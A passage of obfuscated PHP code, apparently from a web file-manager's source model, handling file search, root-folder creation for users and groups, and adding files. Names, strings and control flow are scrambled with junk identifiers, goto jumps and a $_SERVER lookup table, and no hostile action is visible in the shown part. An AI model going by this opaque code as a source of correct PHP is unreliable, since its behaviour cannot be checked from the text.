F“†‰ìèªŸ: if (!$e†‹®Åìè—[$AËñÜ”ÖÆ[160]]) { $a†®Ö¶´ò¼ = array_to_keyvalue($fÀä×‘Ñ·±, $AËñÜ”ÖÆ[33], $AËñÜ”ÖÆ[160]); $f¿§É¹´îÍ = implode($AËñÜ”ÖÆ[47], $a†®Ö¶´ò¼); $Få ´²â“ª = $AËñÜ”ÖÆ[2295]; } $Dø¼°¹è‘¨ = explode($AËñÜ”ÖÆ[47], trim($f¿§É¹´îÍ, $AËñÜ”ÖÆ[47])); return array($Få ´²â“ª, $Dø¼°¹è‘¨); goto CîÇËìë”Æ; CÀÈŒ‚ì›ß: if (!$e†‹®Åìè—) { return array(); } $f¿§É¹´îÍ = $e†‹®Åìè—[$AËñÜ”ÖÆ[160]]; $Få ´²â“ª = $AËñÜ”ÖÆ[7]; goto F“†‰ìèªŸ; CîÇËìë”Æ: } public function listPathType($Dœ…“¡åğ²) { $E¥×®åÉĞÅ =& $_SERVER[¦·]; $B‡“îÅºÎ = $this->fileTypeWhere($Dœ…“¡åğ²); if (!$B‡“îÅºÎ) { return array(); } $Aƒ»§—¼¯Ä = array($E¥×®åÉĞÅ[523] => SourceModel::TYPE_USER, $E¥×®åÉĞÅ[524] => USER_ID, $E¥×®åÉĞÅ[520] => 0, $E¥×®åÉĞÅ[521] => $B‡“îÅºÎ); return $this->listSource($Aƒ»§—¼¯Ä); } public function listSearch($BÊÅ´©óÈ, $c’æ¨Á‹ÍŠ = 300) { goto d×ÕÊÒÜìé; d‘ˆ†ªµÊ‡: if (!isset($dñé…ƒğœ–[$e“’›¼Ù”Ú[397]])) { $dñé…ƒğœ–[$e“’›¼Ù”Ú[397]] = 0; } $B¯§ßâ”õ™ = $e“’›¼Ù”Ú[2349]; $F­¼¸ÓõÜˆ = $B¯§ßâ”õ™; goto dï¢ó»¦¦‡; FÁ‰ÊàÒªç: $this->_listDataApply($c¼ØŒ„¯µ[$e“’›¼Ù”Ú[354]]); $this->_listMake($c¼ØŒ„¯µ); return $c¼ØŒ„¯µ; goto aƒ‡Ú®¾Áİ; dèÛÓ’æµå: $this->_listSearchDesc($c¼ØŒ„¯µ, $BÊÅ´©óÈ, $F­¼¸ÓõÜˆ); $this->_listSearchTag($c¼ØŒ„¯µ, $BÊÅ´©óÈ, $F­¼¸ÓõÜˆ); $this->_listSearchGroupTag($c¼ØŒ„¯µ, $BÊÅ´©óÈ, $F­¼¸ÓõÜˆ); goto FÁ‰ÊàÒªç; d×ÕÊÒÜìé: $e“’›¼Ù”Ú =& $_SERVER[¦·]; if (isset($BÊÅ´©óÈ[$e“’›¼Ù”Ú[2193]]) && $BÊÅ´©óÈ[$e“’›¼Ù”Ú[2193]]) { $BÊÅ´©óÈ[$e“’›¼Ù”Ú[2193]] = str_replace($e“’›¼Ù”Ú[1597], $e“’›¼Ù”Ú[2348], trim($BÊÅ´©óÈ[$e“’›¼Ù”Ú[2193]])); } $dñé…ƒğœ– = $this->_parseSearchWhere($BÊÅ´©óÈ); goto d‘ˆ†ªµÊ‡; dï¢ó»¦¦‡: $this->_listSearchBindPinyin($BÊÅ´©óÈ, $dñé…ƒğœ–, $B¯§ßâ”õ™); $this->alias($e“’›¼Ù”Ú[489])->_makeOrder(); $c¼ØŒ„¯µ = $this->distinct(!0)->field($B¯§ßâ”õ™)->where($dñé…ƒğœ–)->selectPage($c’æ¨Á‹ÍŠ); goto dèÛÓ’æµå; aƒ‡Ú®¾Áİ: } private function _listSearchTag(&$Aùñàô½›, $fÄ§©Ê‰´, $AÇƒĞº¦ï†) { goto fÂÂ°Íä¾‰; F¾Îœ‚¿‰: $B¾ö˜…–¥Ï = array(); $D†„»àÇä = $fÄ§©Ê‰´[$b›Áí‰Éİ[2193]]; foreach ($e¯î„¨Á„ as $cÈó‹ÔóåÔ) { $eÃ›Ô„êò = $cÈó‹ÔóåÔ[$b›Áí‰Éİ[28]]; $f÷±Ç•ô’ö = str_replace($b›Áí‰Éİ[50], $b›Áí‰Éİ[33], Pinyin::encode($eÃ›Ô„êò)); if (stripos($eÃ›Ô„êò, $D†„»àÇä) !== !1 || stripos($f÷±Ç•ô’ö, $D†„»àÇä) !== !1) { $B¾ö˜…–¥Ï[] = $cÈó‹ÔóåÔ[$b›Áí‰Éİ[367]]; } } goto Fµ¶Éë•š„; fÂÂ°Íä¾‰: $b›Áí‰Éİ =& $_SERVER[¦·]; if (!$fÄ§©Ê‰´[$b›Áí‰Éİ[2193]] || $Aùñàô½›[$b›Áí‰Éİ[351]][$b›Áí‰Éİ[340]] > 1) { return; } $e¯î„¨Á„ = Model($b›Áí‰Éİ[2350])->listData(); goto F¾Îœ‚¿‰; Fµ¶Éë•š„: if (!$B¾ö˜…–¥Ï) { return; } $F¾µ‰ßÚÙ = array($b›Áí‰Éİ[393] => array($b›Áí‰Éİ[7], $B¾ö˜…–¥Ï), $b›Áí‰Éİ[1441] => USER_ID); $fÛšŒÉŠÄ = Model($b›Áí‰Éİ[394])->field($b›Áí‰Éİ[75])->where($F¾µ‰ßÚÙ)->select(); goto Eîš¸…‚Ö©; Eîš¸…‚Ö©: $fÛšŒÉŠÄ = array_to_keyvalue($fÛšŒÉŠÄ, $b›Áí‰Éİ[33], $b›Áí‰Éİ[75]); $d‚ÛßŒ¿Ã = array_unique($fÛšŒÉŠÄ); $this->_listSearchMerge($Aùñàô½›, $fÄ§©Ê‰´, $AÇƒĞº¦ï†, $d‚ÛßŒ¿Ã); goto E½”ÄÔÏ©Ú; E½”ÄÔÏ©Ú: } private function _listSearchDesc(&$cï‹³Ğƒ»è, $cä†ˆ¸¦ÎÒ, $dÄ±ÛãË¾) { goto B´˜Œ”…–Õ; B´˜Œ”…–Õ: $CğŠ»‚°•” =& $_SERVER[¦·]; if (!$cä†ˆ¸¦ÎÒ[$CğŠ»‚°•”[2193]] || $cï‹³Ğƒ»è[$CğŠ»‚°•”[351]][$CğŠ»‚°•”[340]] > 1) { return; } $B¯›³œğ® = $this->listSearchChildren($cä†ˆ¸¦ÎÒ[$CğŠ»‚°•”[463]]); goto E…¿š©ÜÔõ; E…¿š©ÜÔõ: $B¯›³œğ® = array_unique($B¯›³œğ®); if (!$B¯›³œğ®) { return; } $E¬”½æõÜ = array($CğŠ»‚°•”[369] => array($CğŠ»‚°•”[7], $B¯›³œğ®), $CğŠ»‚°•”[89] => $CğŠ»‚°•”[405], $CğŠ»‚°•”[359] => array($CğŠ»‚°•”[752], $CğŠ»‚°•”[2195] . $cä†ˆ¸¦ÎÒ[$CğŠ»‚°•”[2193]] . $CğŠ»‚°•”[2195])); goto A–ñ¯å¼‚; A–ñ¯å¼‚: $d‘ìæğéÌ˜ = Model($CğŠ»‚°•”[506])->field($CğŠ»‚°•”[369])->where($E¬”½æõÜ)->select(); $dÁî÷Ü—õ = array_to_keyvalue($d‘ìæğéÌ˜, $CğŠ»‚°•”[33], $CğŠ»‚°•”[369]); $this->_listSearchMerge($cï‹³Ğƒ»è, $cä†ˆ¸¦ÎÒ, $dÄ±ÛãË¾, $dÁî÷Ü—õ); goto eæÕÃ¿Œ‡»; eæÕÃ¿Œ‡»: } private function _listSearchGroupTag(&$BÓî‹›‡ç, $C¡Äº­æË™, $cÖ©›Çóƒ) { goto FÊ‹Œ´ºçÛ; BÈ­¦á’¨Û: $B…ºŒˆ‰òº = array(); $Aïãæá³ˆá = $C¡Äº­æË™[$eÉ²£„çí[2193]]; foreach ($b§ÜÄÓß°ª[$eÉ²£„çí[354]] as $aÙŠà¸‰á) { $EÕï¶×ã£ = $aÙŠà¸‰á[$eÉ²£„çí[28]]; $dÅ¼…Êµ˜ = str_replace($eÉ²£„çí[50], $eÉ²£„çí[33], Pinyin::encode($EÕï¶×ã£)); if (stripos($EÕï¶×ã£, $Aïãæá³ˆá) !== !1 || stripos($dÅ¼…Êµ˜, $Aïãæá³ˆá) !== !1) { $B…ºŒˆ‰òº[] = $aÙŠà¸‰á[$eÉ²£„çí[367]]; } } goto D“†²Ò×¿; FÊ‹Œ´ºçÛ: $eÉ²£„çí =& $_SERVER[¦·]; if (!$C¡Äº­æË™[$eÉ²£„çí[2193]] || $BÓî‹›‡ç[$eÉ²£„çí[351]][$eÉ²£„çí[340]] > 1 || !$C¡Äº­æË™[$eÉ²£„çí[463]]) { return; } $e˜¿ÒÏº»… = $this->sourceInfo($C¡Äº­æË™[$eÉ²£„çí[463]]); goto c¡àà¬‡ÒÎ; fÑ†ö»É¢: $DïÏ‚ÇŒã¸ = array_to_keyvalue($DïÏ‚ÇŒã¸, $eÉ²£„çí[33], $eÉ²£„çí[75]); $dªíš‹ƒ¾ = array_unique($DïÏ‚ÇŒã¸); $this->_listSearchMerge($BÓî‹›‡ç, $C¡Äº­æË™, $cÖ©›Çóƒ, $dªíš‹ƒ¾); goto aÔé¾ó…; D“†²Ò×¿: if (!$B…ºŒˆ‰òº) { return; } $BÂéïòÄòä = array($eÉ²£„çí[393] => array($eÉ²£„çí[7], $B…ºŒˆ‰òº), $eÉ²£„çí[1441] => 0, $eÉ²£„çí[29] => $eÉ²£„çí[2213] . $DÚÃ‘Äª®); $DïÏ‚ÇŒã¸ = Model($eÉ²£„çí[394])->field($eÉ²£„çí[75])->where($BÂéïòÄòä)->select(); goto fÑ†ö»É¢; c¡àà¬‡ÒÎ: if (!$e˜¿ÒÏº»… || $e˜¿ÒÏº»…[$eÉ²£„çí[371]] != SourceModel::TYPE_GROUP) { return; } $DÚÃ‘Äª® = $e˜¿ÒÏº»…[$eÉ²£„çí[458]]; $b§ÜÄÓß°ª = Model($eÉ²£„çí[2351])->get($DÚÃ‘Äª®); goto BÈ­¦á’¨Û; aÔé¾ó…: } private function _listSearchMerge(&$c¦÷ÖÅÓâˆ, $B¬¾Ë§Ö°ì, $FË­£½òğ, $cŸ±ó²Å‹Â) { goto Fƒ×ß°Ò­Å; Dø÷äÂ©ÒÔ: foreach ($dìİ’¯èó as $CàÑ—İ¬É) { $F©¹ªÎ®‹ = $eéÃ‰ÌÏØ[47] . $B¬¾Ë§Ö°ì[$eéÃ‰ÌÏØ[463]] . $eéÃ‰ÌÏØ[47]; if (stripos($CàÑ—İ¬É[$eéÃ‰ÌÏØ[461]], $F©¹ªÎ®‹) !== !1) { $eÃ†ØßË„ª[] = $CàÑ—İ¬É; } } $c¦÷ÖÅÓâˆ[$eéÃ‰ÌÏØ[354]] = array_merge($eÃ†ØßË„ª, $c¦÷ÖÅÓâˆ[$eéÃ‰ÌÏØ[354]]); $c¦÷ÖÅÓâˆ[$eéÃ‰ÌÏØ[351]][$eéÃ‰ÌÏØ[352]] += count($eÃ†ØßË„ª); goto DÜÜØ„Ÿ¤œ; a¼´²‡œ÷–: $e¦œ³¥¼¦¦ = array_diff($cŸ±ó²Å‹Â, $Dã«âÔ½ìã); if (!$e¦œ³¥¼¦¦) { return; } $còó„ƒ†Ç÷ = array($eéÃ‰ÌÏØ[369] => array($eéÃ‰ÌÏØ[7], $e¦œ³¥¼¦¦)); goto aèËİ¿×â¹; aèËİ¿×â¹: $dìİ’¯èó = $this->field($FË­£½òğ)->where($còó„ƒ†Ç÷)->select(); if (!$dìİ’¯èó) { return; } $eÃ†ØßË„ª = array(); goto Dø÷äÂ©ÒÔ; Fƒ×ß°Ò­Å: $eéÃ‰ÌÏØ =& $_SERVER[¦·]; if (!$cŸ±ó²Å‹Â) { return; } $Dã«âÔ½ìã = array_to_keyvalue($c¦÷ÖÅÓâˆ[$eéÃ‰ÌÏØ[354]], $eéÃ‰ÌÏØ[33], $eéÃ‰ÌÏØ[369]); goto a¼´²‡œ÷–; DÜÜØ„Ÿ¤œ: } public function listSearchChildren($bƒˆ’ğƒ‘¶, $F¢ÊÙ±Ú’² = 5000) { goto FÏ×­©÷°Œ; DÄòµ¡•—: $b˜ƒÇÑ•Ş = array($D“ÌãÛĞà[461] => array($D“ÌãÛĞà[752], $Fìá†¿ææë[$D“ÌãÛĞà[461]] . $Fìá†¿ææë[$D“ÌãÛĞà[369]] . $D“ÌãÛĞà[486])); $d¶ËÙÉÙÓ‹ = $this->field($D“ÌãÛĞà[369])->cache(null, 600)->where($b˜ƒÇÑ•Ş)->count(); if ($d¶ËÙÉÙÓ‹ > $F¢ÊÙ±Ú’²) { return $this->_listSearchChildrenNear($bƒˆ’ğƒ‘¶, $F¢ÊÙ±Ú’²); } goto FÕ”ÎøÚŠ; FÏ×­©÷°Œ: $D“ÌãÛĞà =& $_SERVER[¦·]; $FÜäÊ –šó = array(); $Fìá†¿ææë = $this->sourceInfo($bƒˆ’ğƒ‘¶); goto DÄòµ¡•—; FÕ”ÎøÚŠ: $c…×‘ˆøŸ = $this->field($D“ÌãÛĞà[369])->where($b˜ƒÇÑ•Ş)->select(); $FÜäÊ –šó = array_to_keyvalue($c…×‘ˆøŸ, $D“ÌãÛĞà[33], $D“ÌãÛĞà[369]); return $FÜäÊ –šó; goto AÆ‰áÉ—õÌ; AÆ‰áÉ—õÌ: } private function _listSearchChildrenNear($a”„„³„‡, $cÆŠƒˆÙ—º) { goto FŞİ¼Øí–; D¢Ğ‹¥‰É¤: if (!$c†‹îÏº­) { return $E…Ö­º‚†­; } $E‹Ä˜‰¥ÛØ = array($e¨Ë£Ì°ËÇ[463] => array($e¨Ë£Ì°ËÇ[7], $c†‹îÏº­)); $a¹‹æ‹Ò·Æ = $this->field($e¨Ë£Ì°ËÇ[2352])->where($E‹Ä˜‰¥ÛØ)->select(); goto Bœ³¦­ÇºÎ; Bœ³¦­ÇºÎ: $E…Ö­º‚†­ = array_merge($E…Ö­º‚†­, array_to_keyvalue($a¹‹æ‹Ò·Æ, $e¨Ë£Ì°ËÇ[33], $e¨Ë£Ì°ËÇ[369])); $E…Ö­º‚†­ = array_slice($E…Ö­º‚†­, 0, $cÆŠƒˆÙ—º); return $E…Ö­º‚†­; goto F‘ÉÊ­î¸š; Fƒš†ç„‘ö: $a¹‹æ‹Ò·Æ = $this->field($e¨Ë£Ì°ËÇ[2352])->where($E‹Ä˜‰¥ÛØ)->select(); $c†‹îÏº­ = array_to_keyvalue(array_filter_by_field($a¹‹æ‹Ò·Æ, $e¨Ë£Ì°ËÇ[370], $e¨Ë£Ì°ËÇ[83]), $e¨Ë£Ì°ËÇ[33], $e¨Ë£Ì°ËÇ[369]); $E…Ö­º‚†­ = array_merge($E…Ö­º‚†­, array_to_keyvalue($a¹‹æ‹Ò·Æ, $e¨Ë£Ì°ËÇ[33], $e¨Ë£Ì°ËÇ[369])); goto D¢Ğ‹¥‰É¤; FŞİ¼Øí–: $e¨Ë£Ì°ËÇ =& $_SERVER[¦·]; $E…Ö­º‚†­ = array(); $E‹Ä˜‰¥ÛØ = array($e¨Ë£Ì°ËÇ[463] => $a”„„³„‡); goto Fƒš†ç„‘ö; F‘ÉÊ­î¸š: } private function _listSearchBindPinyin($F‰¨‘à¬˜, &$f”Ãô½ÊÅ„, &$Bº°¤ÙßÇ£) { goto f¿ïá¢•÷×; Cƒ§·‰çä§: $dˆñĞ–­ê = array(); $Bº°¤ÙßÇ£ = str_replace(array($F¬øä¥õŸÀ[217], $F¬øä¥õŸÀ[50], $F¬øä¥õŸÀ[2353]), $F¬øä¥õŸÀ[33], $Bº°¤ÙßÇ£); $Bº°¤ÙßÇ£ = $F¬øä¥õŸÀ[2354] . str_replace($F¬øä¥õŸÀ[47], $F¬øä¥õŸÀ[2355], $Bº°¤ÙßÇ£); goto eÇŸß…£×‚; DØ¶è„¥¤î: $dˆñĞ–­ê[] = array($F¬øä¥õŸÀ[2356] => $d¨æù¯ºÓ, $F¬øä¥õŸÀ[916] => $F¬øä¥õŸÀ[2197], array($F¬øä¥õŸÀ[2357] => $d¨æù¯ºÓ, $F¬øä¥õŸÀ[2358] => array($F¬øä¥õŸÀ[7], array($F¬øä¥õŸÀ[416], $F¬øä¥õŸÀ[415])))); $this->join($AÙ´¯ºù‚); $f”Ãô½ÊÅ„ = $dˆñĞ–­ê; goto E‘£™Ö”õ; eÇŸß…£×‚: unset($f”Ãô½ÊÅ„[$F¬øä¥õŸÀ[28]]); foreach ($f”Ãô½ÊÅ„ as $Aïµæ…Ûİ‘ => $c³äËØ¡Âß) { $dˆñĞ–­ê[$F¬øä¥õŸÀ[2354] . $Aïµæ…Ûİ‘] = $c³äËØ¡Âß; } $d¨æù¯ºÓ = array($F¬øä¥õŸÀ[485], $F¬øä¥õŸÀ[2195] . $F‰¨‘à¬˜[$F¬øä¥õŸÀ[2193]] . $F¬øä¥õŸÀ[2195]); goto DØ¶è„¥¤î; f¿ïá¢•÷×: $F¬øä¥õŸÀ =& $_SERVER[¦·]; if (!Input::check($F‰¨‘à¬˜[$F¬øä¥õŸÀ[2193]], $F¬øä¥õŸÀ[306]) || strlen($F‰¨‘à¬˜[$F¬øä¥õŸÀ[2193]]) < 2) { return; } $AÙ´¯ºù‚ = "\114\105\106\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\163\157\165\x72\x63\145\x5f\155\145\x74\x61\x20\155\145\x74\x61\x20\157\156\40\x73\157\x75\x72\x63\145\56\163\x6f\x75\162\143\145\x49\x44\40\75\40\x6d\x65\x74\141\x2e\163\157\x75\x72\x63\145\x49\104"; goto Cƒ§·‰çä§; E‘£™Ö”õ: } private function _parseSearchWhere($C¶Àˆ½½) { goto D‚ŸËß×áá; aÖšÁ¾ëì„: if (isset($C¶Àˆ½½[$D…‹Éï©×[449]])) { $aæµÖµ…ö = array($D…‹Éï©×[2360], $C¶Àˆ½½[$D…‹Éï©×[449]]); if ($b±Ïè¯õ¼Ÿ[$D…‹Éï©×[107]]) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[107]] = array($b±Ïè¯õ¼Ÿ[$D…‹Éï©×[107]], $aæµÖµ…ö, $D…‹Éï©×[2361]); } else { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[107]] = $aæµÖµ…ö; } } if (isset($C¶Àˆ½½[$D…‹Éï©×[2362]])) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[77]] = array($D…‹Éï©×[2359], $C¶Àˆ½½[$D…‹Éï©×[2362]]); } if (isset($C¶Àˆ½½[$D…‹Éï©×[2363]])) { $aæµÖµ…ö = array($D…‹Éï©×[2360], $C¶Àˆ½½[$D…‹Éï©×[2363]]); if ($b±Ïè¯õ¼Ÿ[$D…‹Éï©×[77]]) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[77]] = array($b±Ïè¯õ¼Ÿ[$D…‹Éï©×[77]], $aæµÖµ…ö, $D…‹Éï©×[2361]); } else { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[77]] = $aæµÖµ…ö; } } goto A±Î®„‡ê; cí³¨Ï³ÂØ: if (isset($C¶Àˆ½½[$D…‹Éï©×[2193]]) && $C¶Àˆ½½[$D…‹Éï©×[2193]]) { $aÛ¦ô–† = $C¶Àˆ½½[$D…‹Éï©×[2193]]; $DÂ±¸óà = explode($D…‹Éï©×[50], $aÛ¦ô–†); if (strlen($aÛ¦ô–†) > 2 && (substr($aÛ¦ô–†, 0, 1) == $D…‹Éï©×[113] && substr($aÛ¦ô–†, -1) == $D…‹Éï©×[113]) || substr($aÛ¦ô–†, 0, 1) == $D…‹Éï©×[55] && substr($aÛ¦ô–†, -1) == $D…‹Éï©×[55]) { $aÛ¦ô–† = substr($aÛ¦ô–†, 1, -1); $DÂ±¸óà = array($aÛ¦ô–†); } $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[28]] = array($D…‹Éï©×[485], $D…‹Éï©×[2195] . $aÛ¦ô–† . $D…‹Éï©×[2195]); if (count($DÂ±¸óà) > 1) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[28]] = array(); foreach ($DÂ±¸óà as $FÏ¤’öÙ÷¬) { if (!trim($FÏ¤’öÙ÷¬)) { continue; } $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[28]][] = array($D…‹Éï©×[485], $D…‹Éï©×[2195] . trim($FÏ¤’öÙ÷¬) . $D…‹Éï©×[2195]); } } } return $b±Ïè¯õ¼Ÿ; goto bŠ”‚°“÷É; D‚ŸËß×áá: $D…‹Éï©× =& $_SERVER[¦·]; $b±Ïè¯õ¼Ÿ = array(); if (isset($C¶Àˆ½½[$D…‹Éï©×[703]])) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[107]] = array($D…‹Éï©×[2359], $C¶Àˆ½½[$D…‹Éï©×[703]]); } goto aÖšÁ¾ëì„; A±Î®„‡ê: if (isset($C¶Àˆ½½[$D…‹Éï©×[536]])) { $b±Ïè¯õ¼Ÿ[] = array($D…‹Éï©×[379] => $C¶Àˆ½½[$D…‹Éï©×[536]], $D…‹Éï©×[378] => $C¶Àˆ½½[$D…‹Éï©×[536]], $D…‹Éï©×[916] => $D…‹Éï©×[2197]); } if (isset($C¶Àˆ½½[$D…‹Éï©×[372]])) { $e¨’‡¹« = $C¶Àˆ½½[$D…‹Éï©×[372]]; if ($e¨’‡¹« == $D…‹Éï©×[76]) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[370]] = 1; } else { if ($e¨’‡¹« == $D…‹Éï©×[2364]) { $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[370]] = 0; } else { if ($e¨’‡¹«) { $e¨’‡¹« = is_array($e¨’‡¹«) ? $e¨’‡¹« : explode($D…‹Éï©×[47], $e¨’‡¹«); $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[372]] = array($D…‹Éï©×[384], $e¨’‡¹«); $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[370]] = 0; } } } } if (isset($C¶Àˆ½½[$D…‹Éï©×[463]])) { $b¯´çë°×õ = $this->sourceInfo($C¶Àˆ½½[$D…‹Éï©×[463]]); $b±Ïè¯õ¼Ÿ[$D…‹Éï©×[527]] = array($D…‹Éï©×[485], $b¯´çë°×õ[$D…‹Éï©×[461]] . $C¶Àˆ½½[$D…‹Éï©×[463]] . $D…‹Éï©×[486]); } goto cí³¨Ï³ÂØ; bŠ”‚°“÷É: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dİ¸‰İĞæ•) { $Dê¥­ááëâ =& $_SERVER[¦·]; $Bœ½ù’†š = Model($Dê¥­ááëâ[476])->where(array($Dê¥­ááëâ[1432] => $dİ¸‰İĞæ•))->find(); $bìÊ°ÌØÎÛ = $this->_mkdirRoot(SourceModel::TYPE_USER, $dİ¸‰İĞæ•, $Bœ½ù’†š[$Dê¥­ááëâ[28]]); $this->userDesktopAdd($bìÊ°ÌØÎÛ); return $bìÊ°ÌØÎÛ; } public function userDesktopAdd($bù¡Å˜¹Œ¢) { $bÛëêºÚ¹Í =& $_SERVER[¦·]; $eƒö½¨Ú‚» = LNG($bÛëêºÚ¹Í[2365]); $f¡çè÷†Ô¼ = $this->mkdir($bù¡Å˜¹Œ¢, $eƒö½¨Ú‚»); $this->metaSet($f¡çè÷†Ô¼, $bÛëêºÚ¹Í[2366], $bÛëêºÚ¹Í[83]); $this->metaSet($bù¡Å˜¹Œ¢, $bÛëêºÚ¹Í[2367], $f¡çè÷†Ô¼); } public function groupRootAdd($Fëà´Û‰¸ì) { $e°ô™ÒÉ½ =& $_SERVER[¦·]; $BåÂîõã–‹ = Model($e°ô™ÒÉ½[460])->where(array($e°ô™ÒÉ½[2189] => $Fëà´Û‰¸ì))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Fëà´Û‰¸ì, $BåÂîõã–‹[$e°ô™ÒÉ½[28]]); } public function systemRootPathAdd($D•ƒ·¼¡ƒ) { if ($D•ƒ·¼¡ƒ != $_SERVER[¦·][1092]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $D•ƒ·¼¡ƒ); } public function userRootRemove($C¬Šà•‰ù”) { $dàò —¸îˆ = $this->sourceRoot(SourceModel::TYPE_USER, $C¬Šà•‰ù”); if (!$dàò —¸îˆ) { return; } $this->remove($dàò —¸îˆ, !1); } public function groupRootRemove($FÏÂ½Õ‚–ï) { $fâÉÅ–‚¿ª = $this->sourceRoot(SourceModel::TYPE_GROUP, $FÏÂ½Õ‚–ï); if (!$fâÉÅ–‚¿ª) { return; } $this->remove($fâÉÅ–‚¿ª, !1); } private function _mkdirRoot($E«„ŞÆë‹Õ, $aÚ¸ùé¼‘, $eîÎ»ºœ®Ø) { goto càá¹ÙĞ†„; càá¹ÙĞ†„: $DªÛË·¡©Ñ =& $_SERVER[¦·]; $aîø¡Ì÷Ğ = array($DªÛË·¡©Ñ[368] => 0, $DªÛË·¡©Ñ[523] => $E«„ŞÆë‹Õ, $DªÛË·¡©Ñ[524] => $aÚ¸ùé¼‘, $DªÛË·¡©Ñ[520] => 1, $DªÛË·¡©Ñ[525] => USER_ID, $DªÛË·¡©Ñ[526] => USER_ID, $DªÛË·¡©Ñ[521] => $DªÛË·¡©Ñ[33], $DªÛË·¡©Ñ[527] => $DªÛË·¡©Ñ[472], $DªÛË·¡©Ñ[396] => 0, $DªÛË·¡©Ñ[522] => 0, $DªÛË·¡©Ñ[420] => 0, $DªÛË·¡©Ñ[528] => $DªÛË·¡©Ñ[33]); if ($F´ñ—¿¬ = $this->where($aîø¡Ì÷Ğ)->find()) { return $F´ñ—¿¬[$DªÛË·¡©Ñ[369]]; } goto A‹òâº©®¯; A‹òâº©®¯: $dÏê†±¶Ë’ = "\x4d\x6f\144\145\154\123\157\x75\x72\143\145\56\155\x6b\x64\x69\x72\122\157\157\164\x2e{$E«„ŞÆë‹Õ}\x2e{$aÚ¸ùé¼‘}\56" . $eîÎ»ºœ®Ø; CacheLock::lock($dÏê†±¶Ë’); $aîø¡Ì÷Ğ[$DªÛË·¡©Ñ[28]] = $eîÎ»ºœ®Ø; goto f°ƒì†¬ÀÕ; a•Ô³­àÊ: CacheLock::unlock($dÏê†±¶Ë’); return $a‚Âö¿ğ²Œ; goto b±‰©Ô´É˜; f°ƒì†¬ÀÕ: $a‚Âö¿ğ²Œ = $this->add($aîø¡Ì÷Ğ); $c·³º¯‡¶– = array($DªÛË·¡©Ñ[529] => short_id($a‚Âö¿ğ²Œ)); $this->where(array($DªÛË·¡©Ñ[383] => $a‚Âö¿ğ²Œ))->save($c·³º¯‡¶–); goto a•Ô³­àÊ; b±‰©Ô´É˜: } private function sourceRoot($CÀŒä¿ğÒ, $a•Š¬±Áñì, $CÁî¥ˆÉ = false) { $eÈÈˆ©§ =& $_SERVER[¦·]; $cÈ«ñºæ†å = array($eÈÈˆ©§[368] => 0, $eÈÈˆ©§[523] => $CÀŒä¿ğÒ, $eÈÈˆ©§[524] => $a•Š¬±Áñì); if ($DÛ¤‰ãÌ¨Æ = $this->where($cÈ«ñºæ†å)->find()) { return $CÁî¥ˆÉ ? $DÛ¤‰ãÌ¨Æ : $DÛ¤‰ãÌ¨Æ[$eÈÈˆ©§[369]]; } return !1; } public function sourceRootGroup($c³Ñ‚¸êÒ¹) { $C­ºÊÏö¦ì =& $_SERVER[¦·]; if (is_string($c³Ñ‚¸êÒ¹)) { $c³Ñ‚¸êÒ¹ = array($c³Ñ‚¸êÒ¹); } $cå»éâµ ä = array($C­ºÊÏö¦ì[368] => 0, $C­ºÊÏö¦ì[523] => SourceModel::TYPE_GROUP, $C­ºÊÏö¦ì[524] => array($C­ºÊÏö¦ì[7], $c³Ñ‚¸êÒ¹)); $e÷ÆŒŒÈå· = $this->listSource($cå»éâµ ä, 1000); return array_to_keyvalue($e÷ÆŒŒÈå·[$C­ºÊÏö¦ì[74]], $C­ºÊÏö¦ì[458]); } public function mkfile($eÊ¡Ï¥¿² , $a—‚ŞÚ‡£, $Dò›¹–àôî = '', $C¾¢†Ëè´ = REPEAT_RENAME) { $B„ÆóŸ«—ó =& $_SERVER[¦·]; $d†¤°Äƒ† = Model($B„ÆóŸ«—ó[545])->addFileByContent($Dò›¹–àôî, $a—‚ŞÚ‡£); return $this->_createFileCall($eÊ¡Ï¥¿² , $a—‚ŞÚ‡£, $d†¤°Äƒ†, $C¾¢†Ëè´, $B„ÆóŸ«—ó[1131]); } public function addFile($b‡êëóŠšÛ, $DÏÍô¶¨£, $B¹¿õ†Á£², $D…—”Ü¯ë¸ = false, $d¯›´œãÃ = REPEAT_RENAME) { $dÀÆµ±Ò± = Model($_SERVER[¦·][545])->addFile($DÏÍô¶¨£, $B¹¿õ†Á£², $D…—”Ü¯ë¸); return $this->_createFileCall($b‡êëóŠšÛ, $B¹¿õ†Á£², $dÀÆµ±Ò±, $d¯›´œãÃ); } public function addFileByFileID($déÇÀ¨óé, $aì±“²×–Ã, $eï¹è÷Èô, $bëÈ„´Ø‹ = REPEAT_RENAME) { $D„éÁ‘©¤Š =& $_SERVER[¦·]; $E‹œîô¬ = Model($D„éÁ‘©¤Š[545])->find($aì±“²×–Ã); Model($D„éÁ‘©¤Š[545])->linkAdd($aì±“²×–Ã); return $this->_createFileCall($déÇÀ¨óé, $eï¹è÷Èô, $E‹œîô¬, $bëÈ„´Ø‹); } public function addFileByRemote($fœÑï—–, $b²Å—©éºè, $e²ŠÍÌ ‚», $aóœÎ´É’œ = array(), $FÌ¸ãÃƒèÈ = REPEAT_RENAME) { $f¥Š…ãÅ¤œ = Model($_SERVER[¦·][545])->addFileByRemote($b²Å—©éºè, $e²ŠÍÌ ‚», $aóœÎ´É’œ); return $this->_createFileCall($fœÑï—–, $e²ŠÍÌ ‚», $f¥Š…ãÅ¤œ, $FÌ¸ãÃƒèÈ); } private function _createFileCall($Dó¼Ï’»Æ, $dÖ˜öÕå, $Añç×ååÊ, $CÑ‡ÃšÒ—ó, $A×ÈÉ‚‡çí = "\165\x70\x6c\x6f\x61\x64") { goto E„²Ÿ–ØŞ‘; AÏƒŠ¨…àß: return 